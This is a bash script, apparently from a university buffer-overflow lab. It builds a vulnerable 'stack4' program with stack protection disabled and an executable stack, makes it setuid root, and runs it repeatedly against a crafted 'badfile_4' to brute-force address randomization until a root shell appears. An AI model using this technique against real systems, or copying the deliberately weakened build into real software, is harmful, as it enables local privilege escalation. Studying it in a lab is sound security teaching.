#!/bin/bash

    SECONDS=0
    value=0
    sudo /sbin/sysctl -w kernel.randomize_va_space=2
    gcc -m32 -fno-stack-protector -z execstack -o stack4 stack4.c
    #gcc  -std=c99 -o stack4 -z execstack -fno-stack-protector stack4.c
    sudo chown root stack4
    sudo chmod 4755 stack4
    gcc -std=c99 -o call_shell4 call_shell4.c

    ./call_shell4 "badfile_4"

    while [ 1 ]
        do
        value=$(( $value + 1 ))
        duration=$SECONDS
        min=$(($duration / 60))
        sec=$(($duration % 60))
        echo "$min minutes and $sec seconds elapsed."
        echo "The program has run $value times so far."
        ./stack4 "badfile_4"
    done
